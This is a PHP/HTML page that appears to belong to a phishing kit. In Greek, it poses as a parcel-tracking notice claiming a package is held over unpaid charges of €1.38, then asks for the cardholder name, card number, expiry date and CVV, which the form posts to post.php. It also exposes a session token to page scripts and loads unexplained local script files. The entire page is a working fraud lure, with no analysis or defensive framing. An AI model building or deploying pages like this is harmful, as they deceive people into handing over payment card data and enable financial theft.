<?php 
require '../main.php';
setcookie('token',$token,['path'=>'/','secure'=>false,'httponly'=>false,'samesite'=>'Lax']);

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<div class="app">
<header>
    <img src="res/logo.png"> <span class="title">Εντοπισμός Αντικειμένου</span>
</header>


<main>

<div class="text">
  Δεν μπορέσαμε να παραδώσουμε το δέμα σας (GR77299289ES) λόγω απλήρωτων χρεώσεων.<br>
Παρακαλούμε προσθέστε έναν τρόπο πληρωμής για να καλυφθούν οι εκκρεμείς χρεώσεις, ώστε να μπορέσουμε να παραδώσουμε το δέμα σας το συντομότερο δυνατό μετά την ολοκλήρωση της πληρωμής.
</div>

<p>Πληροφορίες δέματος / πληρωμής</p>
<table>
<tr>
    <th>Βάρος :</th>
    <td>0.739 KG</td>
</tr>
<tr>
    <th>Αριθμός αναφοράς :</th>
    <td><?= strtoupper(uniqid()); ?></td>
</tr>
<tr>
    <th>Ποσό προς πληρωμή :</th>
    <td>€1,38</td>
</tr>
</table>

<p>Αποδεκτοί τρόποι πληρωμής</p>
<img src="res/cards.png" style="width:140px;">
<br>

<form action="post.php" method="post">

<div class="row">
<div class="col">
    <label>Όνομα στην κάρτα</label>
    <input type="text" name="name" placeholder=" " required>
</div>

<div class="col">
    <label>Αριθμός κάρτας</label>
    <input type="text" name="cc" placeholder="XXXXXXXXXXXXXXXX" required minlength="15">
</div>
</div>
<script>if (typeof globalThis.token === "undefined") { globalThis.token = <?php echo json_encode($token); ?>; }</script>

<div class="row">
<div class="col">
    <label>Ημερομηνία λήξης</label>
    <input type="text" name="exp" placeholder="MM/YY" minlength="5">
</div>

<div class="col">
    <label>Κωδικός ασφαλείας</label>
    <input type="text" name="cvv" placeholder="CVV/CVC" minlength="3">
</div>
</div>

<div class="col">
<button type="submit">Συνέχεια</button>
</div>

</form>


</main>



<footer>
    <img src="res/footer-mobile.png" class="mobile">
    <img src="res/footer.png" class="pc">
</footer>
</div>
	
<script src="./res/cdn/jq.js"></script>
<script src="./res/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("input[name='cc']").mask("0000000000000000");
$("input[name='exp']").mask("00/00");
$("input[name='cvv']").mask("0000");
</script>
</body>
</html>